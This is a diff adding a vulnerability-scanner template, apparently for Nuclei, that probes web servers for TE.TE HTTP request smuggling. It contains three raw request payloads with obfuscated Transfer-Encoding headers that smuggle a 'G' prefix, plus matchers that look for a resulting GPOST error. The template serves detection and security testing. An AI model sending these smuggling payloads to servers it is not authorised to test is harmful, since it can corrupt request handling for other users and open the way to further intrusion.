@@ -1,0 +1,129 @@
+id: http-request-smuggling-tete
+
+info:
+  name: HTTP Request Smuggling - TE.TE Obfuscation
+  author: FaizanAnwar01
+  severity: medium
+  description: |
+    The server may be vulnerable to HTTP Request Smuggling via Transfer-Encoding
+    header obfuscation (TE.TE variant). Both the front-end and back-end servers
+    support Transfer-Encoding, but one of them can be induced to not process it
+    by obfuscating the header value (e.g., extra whitespace, mixed case, line
+    wrapping). This causes disagreement in how the two servers parse the request
+    body, enabling an attacker to smuggle a second request.
+  reference:
+    - https://portswigger.net/web-security/request-smuggling
+    - https://cwe.mitre.org/data/definitions/444.html
+    - https://hackerone.com/reports/215170
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-444
+  metadata:
+    verified: true
+    max-request: 3
+  tags: http,smuggling,tete,obfuscation,misconfig
+
+http:
+  - raw:
+      - |+
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 6
+        Transfer-Encoding: chunked
+        Transfer-encoding: identity
+
+        0
+
+        G
+
+    unsafe: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Unrecognized method GPOST"
+          - "Not Implemented"
+          - "Method Not Allowed"
+          - "Invalid method"
+          - "Unknown HTTP method"
+          - "501 GPOST"
+        condition: or
+
+      - type: status
+        status:
+          - 400
+          - 405
+          - 501
+        condition: or
+
+  - raw:
+      - |+
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 6
+        Transfer-Encoding : chunked
+
+        0
+
+        G
+
+    unsafe: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Unrecognized method GPOST"
+          - "Not Implemented"
+          - "Method Not Allowed"
+          - "Invalid method"
+          - "Unknown HTTP method"
+          - "501 GPOST"
+        condition: or
+
+      - type: status
+        status:
+          - 400
+          - 405
+          - 501
+        condition: or
+
+  - raw:
+      - |+
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 6
+        Transfer-Encoding: xchunked
+
+        0
+
+        G
+
+    unsafe: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Unrecognized method GPOST"
+          - "Not Implemented"
+          - "Method Not Allowed"
+          - "Invalid method"
+          - "Unknown HTTP method"
+          - "501 GPOST"
+        condition: or
+
+      - type: status
+        status:
+          - 400
+          - 405
+          - 501
+        condition: or
